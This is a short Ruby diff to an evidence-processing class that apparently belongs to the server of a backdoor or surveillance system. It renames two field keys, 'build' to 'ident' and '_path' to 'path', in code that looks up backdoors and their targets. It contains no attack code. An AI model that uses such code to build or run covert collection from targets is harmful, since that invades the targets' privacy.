@@ -31,7 +31,7 @@ class InstanceProcessor
     @info = RCS::EvidenceManager.instance.instance_info @id
     raise "Instance \'#{@id}\' cannot be found." if @info.nil?
     
-    trace :info, "Created processor for backdoor #{@info['build']}:#{@info['instance']}"
+    trace :info, "Created processor for backdoor #{@info['ident']}:#{@info['instance']}"
     
     # the log key is passed as a string taken from the db
     # we need to calculate the MD5 and use it in binary form
@@ -175,7 +175,7 @@ class InstanceProcessor
 
     # retrieve the target and the dynamic collection for the evidence
     backdoor = ::Item.backdoors.where({_id: evidence.info[:backdoor]}).first
-    target = ::Item.targets.where({_id: backdoor[:_path].last}).first
+    target = ::Item.targets.where({_id: backdoor[:path].last}).first
     ev = ::Evidence.dynamic_new target[:_id].to_s
 
     ev.acquired = evidence.info[:acquired].to_i
